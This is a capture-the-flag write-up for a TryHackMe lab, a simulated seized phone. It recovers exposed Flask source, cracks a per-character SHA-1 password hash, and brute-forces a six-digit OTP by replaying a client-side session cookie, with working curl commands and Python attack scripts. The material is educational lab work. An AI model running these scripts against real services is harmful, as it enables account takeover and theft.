---
description: "TryHackMe BreachBlocker Unlocker — a seized phone rendered in a browser, with a streaming app, a bank app and a Face ID prompt that never succeeds. The whole room turns on one filename: the client bundle is main.js, so the Flask source is main.py, and it is served. That source hands over a flag in a comment, a password hash that is really twelve independent per-character hashes, and a 2FA design whose one-shot OTP lives in a client-side cookie you can replay forever. Every command explained flag by flag, with the timing attack that failed and the reason it failed."
---

# BreachBlocker Unlocker — the phone that shipped its own source code

**TryHackMe · Advent of Cyber 2025 Side Quest 4 · target: `10.x.x.x` (the lab IP changes per lease)**

> **All three flags are redacted** here as `THM{[redacted]}`. Everything that teaches stays: every
> command with every flag explained, the controls that prove each result, the exact hashes, the
> scripts, and the two hours I spent chasing a timing attack that could not work. The flag strings
> themselves teach nothing — they are just proof you were there, and publishing them hands the
> room's answer to the next person instead of letting them earn it.
>
> **What I kept and why:** the account `sbreachblocker@easterbunnies.thm`, the recovered password
> `malharerocks`, the phone passcode `210701`, the database filename `hopflix-874297.db` and the
> full source of the vulnerable functions are *method*, not prize. Redacting those would leave a
> write-up that teaches nothing. Only the three `THM{...}` values are removed.

**The brief:** Sir BreachBlocker has been captured, and Hopper the Detective has his phone. On it:
a Hopflix streaming app, a Hopsec Bank app, messages, photos, settings, and an Authenticator behind
Face ID. Somewhere behind all of it is the key that releases the stolen Advent of Cyber charity
funds. Break into the phone, bypass every authentication layer, get the funds back.

Three flags: `CODE_FLAG`, `HOPFLIX_FLAG`, `BANK_FLAG`.

---

## Vocabulary first, because the room assumes none

A **port** is a numbered door on a machine. Each listening program answers behind one. Port 22 is
traditionally SSH, port 25 is email, port 443 (and 8443) is encrypted web traffic.

**HTTP** is the language browsers speak to web servers. **HTTPS** is the same thing inside an
encrypted tunnel (TLS). A **request** has a *method* (`GET` to read something, `POST` to send
something) and a *path* (`/api/bank-login`).

An **API endpoint** is a URL that returns data rather than a web page — usually **JSON**, which is
just text of the form `{"valid": false}`.

A **hash** is a one-way fingerprint of some text. Feed in `hello`, get out a fixed-length string of
hex. You cannot reverse it, but you can *guess* an input, hash it, and see whether the fingerprints
match. **SHA-1** and **SHA-256** are two common hash functions.

A **session cookie** is a small piece of text the server hands your browser after you log in; the
browser sends it back on every later request so the server knows who you are.

A **side channel** is information that leaks from *how* a system behaves rather than from what it
says — most commonly, how long it takes to answer.

**OTP** (*one-time password*) is the six-digit code a bank texts or emails you as a second factor.
**2FA** (*two-factor authentication*) is the general name for that second step.

**SMTP** (*Simple Mail Transfer Protocol*) is how mail servers accept and forward email.

---

## Phase 1 — Reconnaissance: what is actually listening

Before touching the application, find out what the box runs. **Recon** is the first phase of any
engagement: you cannot attack what you have not enumerated.

```bash
nmap -sT -Pn -p- --min-rate 2000 -T4 -oN nmap-allports.txt 10.x.x.x
```

- `nmap` is the standard port scanner.
- `-sT` is a **full TCP connect scan**: nmap completes an ordinary connection to each port, the way
  any program would. The faster `-sS` half-open scan needs raw socket access, which needs root — so
  `-sT` is the flag that just works when you are not root.
- `-Pn` means "assume the host is up, skip the ping check". Lab boxes often drop pings, and without
  this nmap can decide the target is down and scan nothing.
- `-p-` means **all 65535 ports**, not just nmap's default top 1000. Themed rooms love hiding the
  real application on a high port, and here that pays off immediately.
- `--min-rate 2000` sets a floor of 2000 packets per second so a full sweep takes seconds, not
  minutes.
- `-T4` is the timing template — aggressive, but safe over a lab VPN.
- `-oN <file>` writes normal-format output to a file. **Always save scan output.** You will want to
  reread it in an hour, and rerunning a scan against a lab box you have since knocked over is a
  miserable way to find out you did not.

```
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
8443/tcp open  https-alt
```

Then fingerprint them:

```bash
nmap -sT -Pn -sV -sC -p 22,25,8443 -oN nmap-services.txt 10.x.x.x
```

- `-sV` probes each open port to identify the **software and version** behind it.
- `-sC` runs nmap's default script set — safe, read-only checks that pull banners, certificates and
  similar.

```
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
25/tcp   open  smtp     Postfix smtpd
|_ Commands: AUTH BDAT DATA EHLO ETRN HELO HELP MAIL NOOP QUIT RCPT RSET STARTTLS VRFY ...
8443/tcp open  ssl/http nginx 1.29.3
|_http-title: Mobile Portal
```

Three facts to write down before going further:

1. The application is at `https://10.x.x.x:8443/` and calls itself **Mobile Portal**.
2. SSH is there but, as we confirm later, accepts **publickey only** — it is how the room's admins
   get in, not a way in for us.
3. **A mail server on a phone simulator is not scenery.** A bank app with an emailed OTP needs
   something to send that email. Port 25 is going to matter.

---

## Phase 2 — Read the client before you invoke anything

This is the single most valuable habit in web testing, and it is worth stating as a rule:

> **Read every static file the application serves before you send a single request to an endpoint.**
> The client-side JavaScript documents the API for you — every URL, every method, every field name.
> A wordlist guesses; the client *knows*.

```bash
curl -sk https://10.x.x.x:8443/ -o index.html
grep -n '<script' index.html
```

- `curl` fetches a URL from the command line.
- `-s` is silent (no progress bar).
- `-k` skips certificate verification. The box uses a self-signed certificate, so without `-k`
  curl refuses to talk to it. In a real engagement you would look at *why* a certificate is
  untrusted; in a lab it is always self-signed.
- `-o <file>` writes the body to a file.

One script tag: `<script src="main.js"></script>`. Fetch that too.

`main.js` is 24 KB of deliberately mangled but perfectly readable code, and it hands over the entire
API surface:

| Endpoint | Method | Body | What it does |
|---|---|---|---|
| `/api/check-credentials` | POST | `{email, password}` | Hopflix login → `{valid: true/false}` |
| `/api/get-last-viewed` | GET | – | `{last_viewed}` — rendered into the "Continue Watching" tile |
| `/api/bank-login` | POST | `{account_id, pin}` | → `{success, trusted_emails[]}` |
| `/api/send-2fa` | POST | `{otp_email}` | mails the OTP |
| `/api/verify-2fa` | POST | `{code}` | checks the six digits |
| `/api/release-funds` | POST | – | `{flag}` |

Three things in that file are worth staring at.

**One — the client times its own login requests and then throws the measurement away.**

```js
async function checkCredentials(e, p) {
	const st = performance.now();
	...
	const tt = et - st;
	_t.push({ email: e, password: p, time: tt, timestamp: et });
	...
}
```

`performance.now()` is a high-resolution clock. Nothing in the user interface ever reads `_t`.
Instrumenting response time and discarding the result is the room pointing at a **timing side
channel**. (Hold that thought. It is real, and it is also the thing that cost me the most time.)

**Two — the phone passcode is hard-coded in the client.**

```js
const PHONE_PASSCODE = "210701";
```

It gates the "turn off Face ID" toggle in Settings → Security. Client-side secrets are not secrets.

**Three — the "Release Funds" button is gated on two JavaScript variables.**

```js
if (!window.bankAuthenticated || !window.bank2FAVerified) {
	alert('Access denied. Please complete authentication first.');
	return;
}
```

Anyone can set those to `true` in a browser console. But that only bypasses the *button* — whether
the server enforces its own check is a separate question, and it takes exactly one request to find
out.

The Authenticator app, meanwhile, is a dead end **by construction**. `startFaceID()` always ends in
failure and reschedules itself, and the element that would hold the six-digit code is never
populated by any code path. So the second factor has to arrive by email.

### The static content is intel, not decoration

The Messages app is plain HTML — no requests needed, just read it:

- **Bestie thread:** *"been trying to login to hopflix but I can't remember my password. I think it
  had something to do with rabbits"* — and *"Have you tried 123456?" / "Yeah... That's defo not my
  password."* The room hands us a themed hint **and a free negative control**.
- The Hopflix email address is hard-coded by the client: `sbreachblocker@easterbunnies.thm`.

And the Hopflix catalogue, which I did not read until far too late, is a hint list:

```
Ear Hair Chronicles · Nose Hair: The Documentary · Time & Hair Loss · The Aging Process
K-Dramas About Bunnies · Bunny Love Story · Bunny Warriors · Lucky Bunny Tales
Santa's Beard Pasta: Restaurant Disaster Scandal Documentary · Ru-Paula's Bunny Race
No Cap: The Side Channel Story
```

**"No Cap: The Side Channel Story."** Remember that title.

The three photos (`selfie.png`, `wallpaper.png`, `breaky.png`) are 512×768 PNGs with no metadata and
nothing appended — checked with `file` and `strings`, not assumed. They are flavour art.

---

## Phase 3 — Probing the API, and a status code that lies

Ask the cheapest question available first: **does the server actually check who is asking, or does
it trust the client's ordering?**

```bash
curl -sk -i https://10.x.x.x:8443/api/get-last-viewed
curl -sk -i https://10.x.x.x:8443/api/does-not-exist-canary
curl -sk -i -X POST https://10.x.x.x:8443/api/release-funds
```

- `-i` includes the response headers in the output.
- `-X POST` sets the HTTP method.
- The middle request is a **negative control** — a path that certainly does not exist. Without it,
  you cannot tell "the server said no" from "I typed the URL wrong".

```
GET  /api/get-last-viewed       -> 401 {"error":"Unauthorized"}     + vary: Cookie
GET  /api/does-not-exist-canary -> 404 (Werkzeug's HTML page)
POST /api/release-funds         -> 403 {"error":"Access denied."}
```

`vary: Cookie` means the answer depends on a session cookie: the server keeps real state. The
JavaScript booleans were never the only gate. Good — that kills the shortcut in one request instead
of an hour.

### The trap that broke my first content sweep

Next, sweep for endpoints the JavaScript did not name. And here this app does something backwards:

| Request | Response |
|---|---|
| `GET /api/check-credentials` (a **real** endpoint, wrong method) | **404** |
| `POST /api/CANARY-does-not-exist` (a **fake** endpoint) | **405** |

Normally a real path with the wrong method gives you `405 Method Not Allowed`, and a fake path gives
`404 Not Found`. Here it is inverted. My first `ffuf` run swept with `GET`, filtered out the 404s,
and reported exactly one endpoint — while `check-credentials`, which I *knew* existed, was missing
from the output.

> **This is why every sweep carries a positive control.** A control is a candidate whose answer you
> already know: something that must appear, and something that must not. Read the control rows
> before the result rows. A sweep that loses its positive control is broken, and its "nothing found"
> is a confident wrong answer, not a result.

Re-run it as `POST`:

```bash
ffuf -u https://10.x.x.x:8443/api/FUZZ -w /tmp/api.txt \
     -X POST -H 'Content-Type: application/json' -d '{}' \
     -t 25 -mc all -fc 405,404 -s
```

- `ffuf` is a fast web fuzzer: it substitutes each line of a wordlist into the `FUZZ` placeholder
  and records the response.
- `-w` is the wordlist. Mine was SecLists' API-endpoint lists plus my own guesses — **461 entries
  with destructive names stripped**:

  ```bash
  grep -viE '^(setup|install|reset|clear|block|seed|migrate|init|delete|drop|truncate|purge)$'
  ```

  A content sweep is *not* read-only. It issues a real request to every path it can name, and it
  re-issues them on every re-run. If one of those paths is `/api/reset`, you have just wiped the
  room's data — including any evidence you had not collected yet.
- `-H` adds a header; `-d` sets the request body.
- `-t 25` is 25 concurrent threads. Twenty-five is about the ceiling for a single-vCPU lab VM. Turn
  it up to 80 and you knock the box over, and then you are debugging your own traffic.
- `-mc all` matches every status code, `-fc 405,404` then filters out the two that mean "no such
  route". Note the order: **ffuf's matchers are OR-ed**, so it is usually cleaner to match
  everything and filter down.
- `-s` is silent mode — prints only the matching word.

Controls pass, and the API is closed:

```
bank-login   check-credentials   release-funds   send-2fa   verify-2fa      (POST)
get-last-viewed                                                            (GET)
```

There is also a free, completely side-effect-free method enumerator:

```bash
curl -sk -D- -o /dev/null -X OPTIONS https://10.x.x.x:8443/api/bank-login
```

- `-D-` dumps response headers to standard output; `-o /dev/null` throws the body away.

```
allow: GET, HEAD, OPTIONS, POST
```

Every path answers `OPTIONS`, *including ones that do not exist*, which tells you the Flask app has
a catch-all route. That is the whole explanation for the inverted status codes: a `GET` to
`/api/bank-login` falls through to the catch-all static-file handler, which finds no such file and
says 404. Remember this. It is about to matter enormously.

### And there is no rate limiting anywhere

```
10 001 consecutive failed logins against /api/bank-login in 26.9 s — every one a 401.
```

No lockout, no delay, no captcha. That also exhausts the four-digit PIN space: the PIN is not four
digits.

---

## Phase 4 — The wrong turn: two hours on a timing attack that could not work

This section is the most useful one in the write-up, so it stays in full.

The client instruments response time. The catalogue contains *"No Cap: The Side Channel Story"*. The
hint says the password is about rabbits. So: recover the password one character at a time by
measuring how long the server takes to reject it. Classic.

First, a **dictionary attack**, because it is cheaper than a side channel if it works. Three
complete runs against `/api/check-credentials`:

| Candidate set | Size | Attempts | Time | Result |
|---|---|---|---|---|
| rockyou lines matching `rabbit\|bunny` | 5 972 | 5 972 | 21.9 s | nothing |
| rockyou matching a 19-word rabbit regex | 33 855 | 33 855 | 93.6 s | nothing |
| hand-built themed list × 11 mutations each | 834 | 834 | ~35 s | nothing |

Every run carried `123456` as an **inverted control** — the room told us it is wrong, so if the
cracker ever reports it as valid, the success detector is broken. And every run asserted
`attempts == candidates` at the end, so "not in the list" could never be confused with "the run died
halfway and I did not notice".

Then the timing attack, measured properly — over a **kept-alive connection**, because a fresh TLS
handshake per attempt buries a millisecond of signal under 120 ms of noise:

```python
s = requests.Session()          # one connection, reused
def one(pw):
    st = time.perf_counter()
    s.post(B + "/api/check-credentials", json={"email": E, "password": pw})
    return time.perf_counter() - st

for r in range(20):             # interleaved rounds, so network drift hits every candidate equally
    for c in CHARS:
        samples[c].append(one(c))
```

```
1 900 requests · 95 printable first-characters × 20 rounds
   -> slowest 39.64 ms, median 39.03 ms, standard deviation 0.297 ms. Nothing stands out.
  744 requests · each character repeated 24 times (catches a match at any position)
   -> slowest 40.3 ms, median 39.39 ms. Nothing.
   80 requests · known account vs unknown account, interleaved
   -> 38.98 ms vs 38.81 ms. The two branches are indistinguishable.
```

That last measurement is the decisive one. If the server did *any* extra work for a known account,
that branch would be measurably slower. It is not. I concluded there was no timing side channel,
wrote it down, and moved on.

**I was wrong, and the reason is worth more than the conclusion.** Skip ahead for a moment to the
code I had not found yet:

```python
if len(pwd)*40 != len(phash):
    return jsonify({'valid':False, 'error':'Incorrect Password'})   # <-- returns before any hashing

for ch in pwd:
    ch_hash = hopper_hash(ch)      # thousands of rounds of SHA-1
    if ch_hash != phash[:40]:
        return jsonify({'valid':False, 'error':'Incorrect Password'})
    phash = phash[40:]
```

The timing oracle is real — every extra correct character costs one more multi-thousand-round hash.
But **the length check gates the entire loop**. Unless the password you send is exactly the right
length, the function returns before hashing anything at all. Every one of my 2 700 probes used
one-character or 24-character passwords, and the real password is twelve. I measured the same
zero-work path 2 700 times, very precisely.

I *did* run a length scan early on — `'a' * n` for n from 0 to 20 — and the two highest readings
were n=10 (43.5 ms) and n=12 (46.2 ms) against a ~39 ms baseline. I had used eight samples per
length, decided the spread was noise, and moved on.

> **The anomaly you explain away is the finding.** Twelve was sitting in my own output the whole
> time. The mistake was not "I looked in the wrong place" — it was measuring with too few samples to
> make the reading mean anything, and then treating an unreliable measurement as a settled result.

---

## Phase 5 — The turn: `main.js` → `main.py`

A 4 721-word sweep of the web root had found `index.html`, `main.js` and the three PNGs and nothing
else, and I read that as "the web root is closed". It was not closed. My wordlist simply did not
contain the one filename that mattered.

The application names its own client bundle **`main.js`**. The obvious sibling for a Flask
application is **`main.py`**. `common.txt` does not carry it.

```bash
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' https://10.x.x.x:8443/main.py
```

- `-w` prints a custom format after the transfer — here the status code and the byte count.

```
200 6514
```

```bash
curl -sk https://10.x.x.x:8443/main.py -o main.py
curl -sk https://10.x.x.x:8443/requirements.txt -o requirements.txt   # 200, 44 bytes
```

The entire server-side source, served by its own catch-all static route:

```python
@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)
```

> **The lesson, and it generalises far beyond this room:** hunt for filenames the *application
> itself* names, not filenames an English wordlist knows. `main.js` → `main.py` is a one-character
> edit. Rooms hide `100375.yaml` and `0rd3r937.txt`; no wordlist on earth contains those, and no
> amount of extra threads will find them. When a sweep comes back empty, the question is not "what
> bigger wordlist?" — it is "what does the application already tell me it is called?"

### CODE_FLAG

Line 29:

```python
BANK_ACCOUNT_ID = "hopper"
BANK_PIN = os.getenv('BANK_PIN')
BANK_FLAG = os.getenv('BANK_FLAG')
#CODE_FLAG = THM{[redacted]}
```

A flag in a commented-out line, in source that should never have been reachable. Which is also the
joke — the flag text itself is a pun on exposed source code.

**CODE_FLAG captured.** `Flag 1: THM{[redacted]}`

> `BANK_ACCOUNT_ID = "hopper"` is a red herring. `POST /api/bank-login` with `account_id: "hopper"`
> answers *"User does not exist"* — the constant is dead code that the live handler never reads.
> Source you have just found is evidence, but it is still only a **claim about behaviour**; test it.

---

## Phase 6 — HOPFLIX_FLAG: a password hash that is twelve hashes in a trenchcoat

`main.py` names its databases:

```python
connection  = sqlite3.connect("/hopflix-874297.db")
connection2 = sqlite3.connect("/hopsecbank-12312497.db")
```

`send_from_directory` refuses `..` traversal, so those absolute paths are not reachable as written.
But the deployed build opens them **relative to the application directory** — and that directory is
exactly what the catch-all route serves:

```
GET /hopflix-874297.db        -> 200, 8 192 bytes   (SQLite 3 database)
GET /hopsecbank-12312497.db   -> 404
GET /etc/passwd               -> 404                (so the working directory is not /)
```

One database comes down; the bank's does not.

```bash
sqlite3 hopflix-874297.db ".schema" "SELECT * FROM users;"
```

```
CREATE TABLE users (email text, full_name text, password_hash text);
sbreachblocker@easterbunnies.thm | Sir BreachBlocker | 03c96cef…80720f1a
```

The hash is **480 hexadecimal characters**. Now read the hashing function:

```python
def hopper_hash(s):
    res = s
    for i in range(5000):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res
```

and the way it is used in `check_credentials`: `for ch in pwd: ch_hash = hopper_hash(ch)`, compared
against `phash[:40]`, then `phash = phash[40:]`.

**Each character is hashed on its own, and the stored value is the twelve results glued together.**
SHA-1 produces 40 hex characters, and 480 / 40 = 12, so the password is twelve characters long and
every character can be attacked independently. This is not password cracking. It is a **rainbow
table with a hundred entries** — one per printable character.

Split the hash into 40-character blocks and two of them repeat (positions 1 and 4, positions 5 and
7), which by itself proves the scheme is positional.

The first attempt at the table used 5000 rounds, as the source says, and matched **nothing**. Rather
than assume the database was foreign, let the round count be the unknown: iterate SHA-1 on each
printable character and check *every* intermediate value against the twelve blocks.

```python
blocks = {h[i:i+40] for i in range(0, 480, 40)}
for c in string.printable[:100]:
    res = c
    for n in range(1, 20001):
        res = hashlib.sha1(res.encode()).hexdigest()
        if res in blocks:
            print(c, n, res)
```

Ten distinct blocks match, **all at n = 1000**. The `main.py` being served is a slightly stale copy
of the deployed code — 1000 rounds in production, 5000 in the file. Read the blocks in order:

```
m  a  l  h  a  r  e  r  o  c  k  s     ->     malharerocks
```

He named his password after the king. And it *is* rabbit-adjacent — "Malhare" — which is why no
amount of `rabbit|bunny` grepping through rockyou was ever going to find it. The hint was true and
useless at the same time.

Verified against the live application, not assumed:

```bash
curl -sk -c jar.txt -X POST https://10.x.x.x:8443/api/check-credentials \
     -H 'Content-Type: application/json' \
     -d '{"email":"sbreachblocker@easterbunnies.thm","password":"malharerocks"}'
curl -sk -b jar.txt https://10.x.x.x:8443/api/get-last-viewed
```

- `-c jar.txt` saves cookies the server sets into a file; `-b jar.txt` sends them back on the next
  request. That is how you carry a session on the command line.

```
{"valid":true}
{"last_viewed":"THM{[redacted]}"}
```

**HOPFLIX_FLAG captured.** `Flag 2: THM{[redacted]}`

### Why a length gate makes a timing attack *harder*, not impossible

For completeness, here is how the intended side channel works once you know the shape of the code.
It is a two-stage attack:

1. **Find the length.** Send `'a' * n` for n = 1…24, many samples each, interleaved. Every wrong
   length returns before any hashing; the right length pays for one 1000-round SHA-1. That is a
   small but real bump, and with enough samples it separates cleanly.
2. **Walk the characters.** Fix the length. For position i, try each candidate character with the
   already-known prefix in front of it and filler behind. The correct character buys one more
   1000-round hash before the early return. 12 positions × ~40 candidates ≈ 500 measurements.

The failure mode to avoid is the one I fell into: measuring stage 2 without having done stage 1.
Every reading is then taken from the wrong branch of the code, and every reading agrees with every
other, which *looks* exactly like "there is no signal here".

---

## Phase 7 — BANK_FLAG: password reuse, then a one-time code that is not one-time

### The PIN

`bank_login` checks `sha256(pin).hexdigest() == phash` against the database that is **not**
downloadable. So the PIN has to be guessed — and the first guess after recovering any password is
that same password somewhere else.

```bash
curl -sk -c bank.txt -X POST https://10.x.x.x:8443/api/bank-login \
     -H 'Content-Type: application/json' \
     -d '{"account_id":"sbreachblocker@easterbunnies.thm","pin":"malharerocks"}'
```

```json
{"success":true,"requires_2fa":true,
 "trusted_emails":["carrotbane@easterbunnies.thm","malhare@easterbunnies.thm"]}
```

Password reuse across the streaming account and the bank. Which also retired the six-digit PIN
brute force that had been grinding in the background — it was 200 000 candidates into 1 100 000 and
would have found nothing, because the PIN is not numeric at all.

> **Cost discipline:** that background run was launched only after multiplying it out first —
> 1.1 million candidates at the ~400 requests/second the box had already demonstrated is about
> 45 minutes. Say the finishing time out loud *before* you start, and an abandoned run gets reported
> as abandoned, never as "found nothing".

### Bug 1 — the OTP recipient is chosen by the client

```python
def send_otp_email(otp, to_addr):
    if not validate_email(to_addr): return -1
    allowed_emails  = session['bank_allowed_emails']
    allowed_domains = session['bank_allowed_domains']
    domain = to_addr.split('@')[-1]
    if domain not in allowed_domains and to_addr not in allowed_emails:
        return -1
```

The user interface offers a dropdown of two "trusted" addresses. The server checks the **domain**.
Anything at `easterbunnies.thm` is accepted, trusted list or not — confirmed empirically:

```
carrotbane@easterbunnies.thm  -> {"success":true}    (on the trusted list)
canary9f3@easterbunnies.thm   -> {"success":true}    <- NOT on the list. The domain check wins.
x@canary-nope-9f3.thm         -> {"success":false}
x@hopsecbank.thm              -> {"success":false}
```

That is the room's intended bug: *"Your account is shared. Any person in your authorized group or
domain can receive an OTP for you."* Send the code to an address you control inside that domain.

The box's Postfix is a wide-open relay — from an unauthenticated external client,
`RCPT TO:<someone@example.com>` answers `250 2.1.5 Ok`, as does `RCPT TO:<x@[my.ip.here]>`.

I did **not** take that path, deliberately. Count its hidden dependencies first:

1. I need a mail listener on my own VPN address, port 25.
2. Port 25 is privileged — binding it needs root, and this session had no passwordless sudo.
3. Kali's ufw is `active` with `DEFAULT_INPUT_POLICY="DROP"`, so even a working listener would be
   firewalled until someone runs `ufw allow 25/tcp`.
4. `easterbunnies.thm` would have to be a domain Postfix rewrites toward me, which I cannot confirm
   without 1–3 working first.

> **If a negative result would be ambiguous, do not run the experiment — re-engineer it until its
> negative result means one thing.** Four unproven dependencies means an hour of silence would tell
> me nothing: not whether the bug works, not whether the mail was sent, not whether my own firewall
> ate it. Prefer a success signal that arrives through a channel you already control.

### Bug 2 — the "one-time" code lives in a cookie you keep

```python
two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
session['bank_2fa_code'] = encrypt(two_fa_code)
```

```python
if code == decrypt(session.get('bank_2fa_code')):
    session['bank_2fa_verified'] = True
    return jsonify({'success': True})
else:
    if 'bank_2fa_code' in session:
        del session['bank_2fa_code']
    return jsonify({'error': 'Invalid code'}), 401
```

Flask's `session` is a **client-side signed cookie**. It is signed so you cannot forge it, but it
lives in your browser, not on the server. So `del session['bank_2fa_code']` does not destroy
anything — it only changes the cookie the server hands *back*. The copy already in your hand still
carries the encrypted code and still verifies.

Replay the same cookie on every guess and the "one wrong answer burns the code" defence disappears.
Combine that with the total absence of rate limiting proven in Phase 3, and a six-digit code is a
1 000 000-item space with unlimited attempts.

```python
# capture one cookie that carries a pending OTP
boot.post(B + "/api/bank-login", json={"account_id": ACC, "pin": PIN})
boot.post(B + "/api/send-2fa",  json={"otp_email": "carrotbane@easterbunnies.thm"})
COOKIE = boot.cookies.get("session")

# control: a deliberately wrong guess must give 401 "Invalid code",
# NOT 404 "No 2FA code generated" — a 404 would mean the replay premise is dead
probe = requests.post(B + "/api/verify-2fa", json={"code": "000000"},
                      cookies={"session": COOKIE}, verify=False)
assert probe.status_code == 401

# ...then 10^6 guesses, all sending that same cookie
r = s.post(B + "/api/verify-2fa", json={"code": code},
           cookies={"session": COOKIE}, timeout=20)
```

Multiplied out before starting: 10⁶ candidates at a measured **533 requests/second** across 24
threads — 31 minutes worst case, about 16 expected. The script also counts every distinct
(status, body) pair, so a third response state cannot be silently swallowed by a boolean check, and
asserts its attempt count at the end.

When the code lands, the response carries a session with `bank_2fa_verified` set. Send that cookie
to the last endpoint:

```python
requests.post(B + "/api/release-funds", cookies={"session": verified_cookie}, verify=False)
```

```json
{"flag":"THM{[redacted]}"}
```

**BANK_FLAG captured.** `Flag 3: THM{[redacted]}`

---

## What actually went wrong on the way, and the rules that would have prevented it

Four wrong turns. Each one is a rule.

**1. A content sweep reported "nothing there" while its own positive control was missing from the
output.** The GET sweep of `/api/` returned one endpoint and silently dropped five I already knew
existed, because this app answers 404 (not 405) for a real path with the wrong method.
→ *Every sweep carries a positive and a negative control, and you read the control rows before the
result rows. A sweep that loses its positive control is broken, and its empty result is a confident
wrong answer.*

**2. I concluded "no timing side channel" from 2 700 measurements taken on the wrong branch of the
code.** The oracle was real; a length check in front of it meant every probe I sent returned before
doing any work.
→ *Before declaring a side channel absent, enumerate what has to be true for it to fire. If you have
not read the code, you do not know which branch you are timing — so a null result only rules out the
branch you happened to hit.*

**3. The password length was in my own output for two hours and I called it noise.** An eight-sample
length scan showed n=12 at 46.2 ms against a 39 ms baseline; I decided the spread was noise and moved
on.
→ *The anomaly you explain away is the finding. If a measurement is too noisy to act on, that is a
reason to take more samples, not a reason to conclude "no signal".*

**4. A 4 721-word wordlist swept the web root and missed `main.py`, which was the entire room.** The
application names its own bundle `main.js`.
→ *Hunt filenames the application itself names, not filenames an English dictionary knows. When a
sweep comes back empty, the next question is never "a bigger wordlist" — it is "what does this app
already tell me it is called?"*

## Cleaning up

Everything this engagement started, it stopped, and every claim was checked rather than assumed:

| Started | Stopped by | Verified with |
|---|---|---|
| background 6-digit PIN brute force | `kill <PID>` | `ps -o pid= -p <PID>` → no such process |
| background OTP brute force | ran to completion | `ps` → gone |
| nmap / ffuf runs | exited on their own | `ps -eo pid,cmd \| grep ffuf` → nothing |
| the target's SSH host key added to `~/.ssh/known_hosts` | removed with `ssh-keygen -R` | `ssh-keygen -F <ip>` → no match |

Nothing was uploaded to the target, nothing was written to it, and no account or file on the box was
modified. The only state this engagement created on the target was a handful of session cookies and
a couple of OTP emails to addresses inside the room's own domain.

## The one-paragraph version

The phone simulator serves its own Flask source at `/main.py`, because the catch-all static route
serves the application directory and nobody thought about the `.py` file sitting in it. That source
carries `CODE_FLAG` in a comment, names the SQLite database that is also downloadable, and reveals
that the password hash is twelve independent per-character SHA-1 chains — a hundred-entry rainbow
table, not a crack. The recovered password is reused as the bank PIN. The bank's second factor mails
a six-digit code to any address in a domain the client picks, and stores the code in a client-side
Flask cookie that can be replayed indefinitely against an endpoint with no rate limiting. Three
authentication layers, none of which survives contact with the source code that describes them.

---

## Appendix — the fifth wrong turn, and why the counter mattered

The first million-guess run against `/api/verify-2fa` finished cleanly and found nothing:

```
DONE attempts=1000000 in 1953.1s
   404 x 999976 {"error":"No 2FA code generated"}
   401 x 24     {"error":"Invalid code"}
HITS: []
```

The obvious reading — "the OTP is not six digits" — is wrong, and the only reason I know that is the
distinct-response counter. **999 976 of the million requests never reached the code comparison at
all.** They hit `if not session.get('bank_2fa_code')` and returned 404. Exactly 24 requests carried
a live cookie. The run used **24 threads**: one good request per worker, then nothing.

The bug was in my HTTP client, not in the attack.

```python
s = requests.Session()
r = s.post(url, json={"code": code}, cookies={"session": COOKIE})   # <-- wrong
```

`requests.Session.prepare_request` merges the per-request `cookies=` into the session's jar with
**`overwrite=False`**:

```python
merged_cookies = merge_cookies(merge_cookies(RequestsCookieJar(), self.cookies), cookies)
```

First request: the jar is empty, my cookie is used, the server answers 401 — correct. That response
carries a `Set-Cookie` with `bank_2fa_code` deleted, which `requests` dutifully stores. From the
second request onward the jar already holds a cookie named `session`, `overwrite=False` refuses to
replace it, and every request silently sends the server's neutered copy. The client was undoing the
attack, one worker at a time.

Falsified with a six-request experiment *before* spending another half hour:

```
BROKEN (Session + cookies=):            [401, 404, 404, 404, 404, 404]
FIXED  (Cookie header + jar cleared):   [401, 401, 401, 401, 401, 401]
```

```python
r = s.post(url, json={"code": code}, headers={"Cookie": "session=" + COOKIE}, timeout=20)
s.cookies.clear()
```

And the guard that makes this cost seconds instead of half an hour if it ever recurs — abort on the
first 404, and print a running 404 count with every progress line:

```
control probe: 401 {"error":"Invalid code"}
[     51s]  25000/1000000  487 req/s  404s=0
...
DONE attempts=430548 in 920.2s
   401 x 430547 {"error":"Invalid code"}
   200 x      1 {"success":true}
release-funds: 200 {"flag":"THM{[redacted]}"}
```

`401 × 430547`, `200 × 1`, **zero 404s** — every request a genuine guess, and the numbers say so
rather than the hope saying so. The code landed at attempt 430 548 of a million, in 920 seconds.

> **The rule this earns:** a control that runs only at the *start* of a long job proves the first
> iteration, not the millionth. My pre-run probe passed, and it passed honestly — the premise really
> was true for request 1. Anything that can decay mid-run needs its health checked **during** the
> run: a counter on every progress line, and an abort on the first bad response. Otherwise a broken
> instrument hands you a clean, confident, completely wrong negative result — and a "finished" run
> that tested nothing looks exactly like a finished run that tested everything.
